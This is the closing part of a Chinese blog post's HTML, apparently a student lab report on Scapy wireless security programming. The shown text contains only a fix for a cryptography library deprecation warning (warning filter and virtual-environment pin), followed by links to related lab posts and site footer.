+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import warnings</span><br><span class="line">from cryptography.utils import CryptographyDeprecationWarning</span><br><span class="line"><span class="comment"># 过滤掉 cryptography 的弃用警告</span></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=CryptographyDeprecationWarning)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>降低<code>cryptography</code>版本，使其和<code>scapy</code>兼容  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 因为这个是python的一个库，当前的kali不太支持apt方式安装  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建虚拟环境</span></span><br><span class="line">python3 -m venv <span class="built_in">env</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 激活虚拟环境</span></span><br><span class="line"><span class="built_in">source</span> <span class="built_in">env</span>/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装指定版本的cryptography</span></span><br><span class="line">pip install cryptography==42.0.5</span><br><span class="line"></span><br><span class="line"><span class="comment"># 之后使用虚拟环境中的python运行代码，就不会出现警告</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://MarsMrx.github.io">MarsMrx</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://marsmrx.github.io/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x05/">https://marsmrx.github.io/2026/10/23/25年3-6月大三下/MIS/chap0x05/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://MarsMrx.github.io" target="_blank">MarsMrx's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">无线网络安全</a><a class="post-meta__tags" href="/tags/Scapy/">Scapy</a></div><div class="post-share"><div class="social-share" data-image="/img/cat-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x06/" title="实验六 WPA/WPA2 PSK 破解｜MIS"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">实验六 WPA/WPA2 PSK 破解｜MIS</div></div><div class="info-2"><div class="info-item-1">【大三下25年3-6月】介绍 WEP、WPA 与 WPA2 的基本原理及四次握手过程，结合 Kali 与无线网卡实践 WPA/WPA2 PSK 破解实验，理解握手包、PMK、PTK 与字典攻击之间的关系。</div></div></div></a><a class="pagination-related" href="/2026/10/21/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x04/" title="实验四 Scapy 基础与数据包嗅探｜MIS"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">实验四 Scapy 基础与数据包嗅探｜MIS</div></div><div class="info-2"><div class="info-item-1">【大三下25年3-6月】使用 Scapy 完成网络数据包捕获与分析实验，运行 ex-1.py 至 ex-6.py 等脚本，说明输入输出、核心功能及关键参数，并记录无线嗅探实践。</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/10/16/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x01/" title="实验一 无线接入网监听｜MIS"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-10-16</div><div class="info-item-2">实验一 无线接入网监听｜MIS</div></div><div class="info-2"><div class="info-item-1">【大三下25年3-6月】记录无线接入网监听实验，使用 Kali 与 USB 无线网卡查看硬件及驱动信息，配置监听模式并捕获 802.11 数据包，结合 Wireshark 示例抓包实践 WPA/WPA2 PSK 解密与 SSID 统计分析。</div></div></div></a><a class="pagination-related" href="/2026/10/21/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x02/" title="实验二 无线接入网入侵与防御｜MIS"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-10-21</div><div class="info-item-2">实验二 无线接入网入侵与防御｜MIS</div></div><div class="info-2"><div class="info-item-1">【大三下25年3-6月】实践无线接入网中的 Deauthentication 攻击与隐藏 SSID 发现，记录无线网卡监听配置、攻击过程及抓包分析方法。</div></div></div></a><a class="pagination-related" href="/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x06/" title="实验六 WPA&#x2F;WPA2 PSK 破解｜MIS"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-10-23</div><div class="info-item-2">实验六 WPA&#x2F;WPA2 PSK 破解｜MIS</div></div><div class="info-2"><div class="info-item-1">【大三下25年3-6月】介绍 WEP、WPA 与 WPA2 的基本原理及四次握手过程，结合 Kali 与无线网卡实践 WPA/WPA2 PSK 破解实验，理解握手包、PMK、PTK 与字典攻击之间的关系。</div></div></div></a><a class="pagination-related" href="/2026/10/21/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x04/" title="实验四 Scapy 基础与数据包嗅探｜MIS"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-10-21</div><div class="info-item-2">实验四 Scapy 基础与数据包嗅探｜MIS</div></div><div class="info-2"><div class="info-item-1">【大三下25年3-6月】使用 Scapy 完成网络数据包捕获与分析实验，运行 ex-1.py 至 ex-6.py 等脚本，说明输入输出、核心功能及关键参数，并记录无线嗅探实践。</div></div></div></a><a class="pagination-related" href="/2026/10/21/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x03/" title="实验三 Evil Twin 无线网络攻击｜MIS"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-10-21</div><div class="info-item-2">实验三 Evil Twin 无线网络攻击｜MIS</div></div><div class="info-2"><div class="info-item-1">【大三下25年3-6月】围绕 Evil Twin（邪恶双胞胎）攻击搭建实验环境，介绍同名伪造热点、hostapd 与 dnsmasq 的配置，以及无线网络安全风险与防御思路。</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/cat-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">MarsMrx</div><div class="author-info-description">的小窝U•ェ•*U
+</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/MarsMrx" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3536663251@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C5%EF%BC%9A%E5%9F%BA%E4%BA%8E-Scapy-%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%BC%96%E7%A8%8B%E5%AE%9E%E8%B7%B5"><span class="toc-text">实验5：基于 Scapy 的无线网络攻防编程实践</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%BB%E5%8A%A1"><span class="toc-text">实验任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9"><span class="toc-text">实验内容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E4%BD%BF%E7%94%A8-Scapy-%E8%BF%9B%E8%A1%8C%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2"><span class="toc-text">实验一：使用 Scapy 进行无线网络嗅探</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%EF%BC%9A%E4%BD%BF%E7%94%A8-Scapy-%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89-Wifi-%E8%AE%BE%E5%A4%87"><span class="toc-text">步骤一：使用 Scapy 查找所有 Wifi 设备</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%EF%BC%9A%E4%BD%BF%E7%94%A8-Scapy-%E6%9F%A5%E6%89%BE%E5%B9%B6%E6%89%93%E5%8D%B0%E6%89%80%E6%9C%89%E6%A3%80%E6%B5%8B%E5%88%B0%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85%E7%B1%BB%E5%9E%8B%E5%92%8C%E5%9C%B0%E5%9D%80"><span class="toc-text">步骤二：使用 Scapy 查找并打印所有检测到的数据包类型和地址</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BA%8C%EF%BC%9A%E4%BD%BF%E7%94%A8-Scapy-%E5%88%9B%E5%BB%BA%E8%99%9A%E5%81%87-AP"><span class="toc-text">实验二：使用 Scapy 创建虚假 AP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%EF%BC%9A%E5%AE%89%E8%A3%85%E5%B9%B6%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83"><span class="toc-text">步骤一：安装并配置环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%EF%BC%9A%E4%BD%BF%E7%94%A8-Scapy-%E6%9E%84%E5%BB%BA%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%B8%A7"><span class="toc-text">步骤二：使用 Scapy 构建无线网络数据帧</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%89%EF%BC%9A%E4%BD%BF%E7%94%A8-Scapy-%E6%96%AD%E5%BC%80%E8%AE%BE%E5%A4%87%E4%B8%8E-Wi-Fi-%E7%9A%84%E8%BF%9E%E6%8E%A5"><span class="toc-text">实验三：使用 Scapy 断开设备与 Wi-Fi 的连接</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%80%EF%BC%9A%E6%94%BB%E5%87%BB%E8%80%85%E6%9C%AA%E6%8E%A5%E5%85%A5%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C"><span class="toc-text">场景一：攻击者未接入无线网络</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF%E4%BA%8C-%E6%94%BB%E5%87%BB%E8%80%85%E4%B8%8E%E5%8F%97%E5%AE%B3%E8%80%85%E5%9D%87%E6%8E%A5%E5%85%A5%E5%90%8C%E4%B8%80%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C"><span class="toc-text">场景二:攻击者与受害者均接入同一无线网络</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%B8%8E%E8%A7%A3%E5%86%B3"><span class="toc-text">问题与解决</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x09/" title="实验九 CVE-2022-30024 固件静态分析与逆向分析｜MIS">实验九 CVE-2022-30024 固件静态分析与逆向分析｜MIS</a><time datetime="2026-10-22T16:20:00.000Z" title="发表于 2026-10-23 00:20:00">2026-10-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x08/" title="实验八 CVE-2022-30024 漏洞复现与栈溢出实践｜MIS">实验八 CVE-2022-30024 漏洞复现与栈溢出实践｜MIS</a><time datetime="2026-10-22T16:15:00.000Z" title="发表于 2026-10-23 00:15:00">2026-10-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x07/" title="实验七 物联网固件安全基础｜MIS">实验七 物联网固件安全基础｜MIS</a><time datetime="2026-10-22T16:10:00.000Z" title="发表于 2026-10-23 00:10:00">2026-10-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x06/" title="实验六 WPA/WPA2 PSK 破解｜MIS">实验六 WPA/WPA2 PSK 破解｜MIS</a><time datetime="2026-10-22T16:05:00.000Z" title="发表于 2026-10-23 00:05:00">2026-10-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/10/23/25%E5%B9%B43-6%E6%9C%88%E5%A4%A7%E4%B8%89%E4%B8%8B/MIS/chap0x05/" title="实验五 基于 Scapy 的无线网络攻防编程实践｜MIS">实验五 基于 Scapy 的无线网络攻防编程实践｜MIS</a><time datetime="2026-10-22T16:00:00.000Z" title="发表于 2026-10-23 00:00:00">2026-10-23</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/banner_img.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By MarsMrx</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
